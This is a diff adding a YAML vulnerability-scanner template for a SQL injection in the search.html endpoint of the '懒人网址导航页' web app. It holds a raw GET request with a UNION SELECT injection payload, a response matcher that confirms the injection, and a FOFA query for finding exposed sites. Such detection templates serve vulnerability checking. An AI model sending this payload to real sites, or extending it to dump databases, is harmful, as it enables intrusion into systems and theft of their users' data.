@@ -1,0 +1,26 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - e10adc3949ba59abbe56e057f20f883e
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /search.html?keyword='+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x2d2d2d2d2d,md5(123456),0x2d2d2d2d2d),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+id: lanren-search_html-sql
+info:
+    author: Superhero
+    description: |-
+        fofa: body="./templates/antidote/css/style.css"
+        懒人网址导航页 search.htm 接口处存在 SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息(例如管理员后台密码、站点用户个人信息)之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。
+    name: 懒人网址导航页 search.html SQL注入漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247483925&idx=1&sn=0569b6033495591bde3ccc171b4286d5&chksm=c267b726f5103e30436bb7b44746121e201283ecb21bd6bf50f446e6a15c34141631533f79b9&token=377357801&lang=zh_CN&poc_token=HKoAFWejeWzt3bftNwOMxYcB5ymjEkP5AdL6cHCU
+    severity: high
+    tags: []
